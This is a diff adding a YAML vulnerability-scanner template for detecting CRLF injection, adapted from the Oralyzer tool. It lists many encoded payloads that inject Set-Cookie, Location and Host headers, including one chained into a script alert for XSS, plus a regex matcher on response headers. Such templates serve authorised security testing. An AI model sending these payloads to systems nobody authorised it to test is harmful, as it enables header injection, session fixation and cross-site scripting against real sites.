@@ -1,0 +1,49 @@
+id: crlf-extended
+
+info:
+  name: CRLF Injection Detection inspired by Oralyzer
+  author: roninja,reewardius
+  severity: medium
+  description: CRLF extended from Oralyzer
+  reference:
+    - https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
+    - https://github.com/r0075h3ll/Oralyzer/blob/master/core/crlf.py
+    - https://infosecwriteups.com/6000-with-microsoft-hall-of-fame-microsoft-firewall-bypass-crlf-to-xss-microsoft-bug-bounty-8f6615c47922
+  tags: crlf
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0aSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%0d%0aHost:%20{{Hostname}}%0d%0aCookie:%20roninja=roninja%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aSet-Cookie:%20roninja=roninja%0d%0a%0d%a"
+      - "{{BaseURL}}/%0d%0aLocation:www.google.com%0d%0a"
+      - "{{BaseURL}}/%0d%0aSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%0d%0ahost:%20www.google.com"
+      - "{{BaseURL}}/%0d%0ahost:%20www.google.com%0d%0a"
+      - "{{BaseURL}}/%0dSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%23%0D%0ALocation:www.google.com;"
+      - "{{BaseURL}}/%3f%0d%0aLocation:%0d%0aroninja-x:roninja-x%0d%aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E"
+      - "{{BaseURL}}/%5Cr%20Set-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%5Cn%20Set-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%5Cn%5CtSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%5CnSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5Cr%5Cnhost:%20www.google.com%5Cr%5Cn"
+      - "{{BaseURL}}/%5Cr%5CtSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5CrSet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%5cr%5cnLocation:www.google.com"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8DLocation:www.google.com"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8DSet-Cookie:roninja=roninja"
+      - "{{BaseURL}}/%E5%98%8D%E5%98%8ALocation:www.google.com"
+      - "{{BaseURL}}/%E5%98%8D%E5%98%8ASet-Cookie:roninja=roninja"
+      - "{{BaseURL}}/%u000ASet-Cookie:roninja=roninja;"
+      - "{{BaseURL}}//www.google.com/%2F%2E%2E%0D%0Aroninja-x:roninja-x"
+      - "{{BaseURL}}/www.google.com/%2E%2E%2F%0D%0Aroninja-x:roninja-x"
+      - "{{BaseURL}}/www.google.com/%2F..%0D%0Aroninja-x:roninja-x"
+      
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        regex:
+          - '(?m)^(?:(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)www\.google\.com\/?(\/|[^.].*)?$|(?:(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(roninja=roninja)(?:\s*?)(?:$|;)|roninja-x))'
+        part: header
